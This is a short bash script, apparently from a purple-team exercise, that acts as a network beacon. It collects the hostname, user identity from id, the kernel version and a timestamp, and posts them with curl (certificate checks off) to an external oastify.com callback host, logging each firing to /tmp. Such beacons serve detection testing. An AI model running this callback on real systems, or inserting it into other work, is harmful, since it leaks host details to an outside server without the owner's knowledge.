#!/bin/bash
LOG=/tmp/purple_team_a1_runlog.txt
HOST="ua8v567e4ro553i1oj8br0fgu70yosch.oastify.com"
DATA="A1 beacon host=$(hostname) user=$(id) kernel=$(uname -r) ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
curl -sk "https://$HOST/purple-team-a1-${1:-stage}" -d "$DATA" 2>&1 | tee -a $LOG
echo "[A1 beacon] $(date -u +%Y-%m-%dT%H:%M:%SZ) fired path=/purple-team-a1-${1:-stage}" >> $LOG
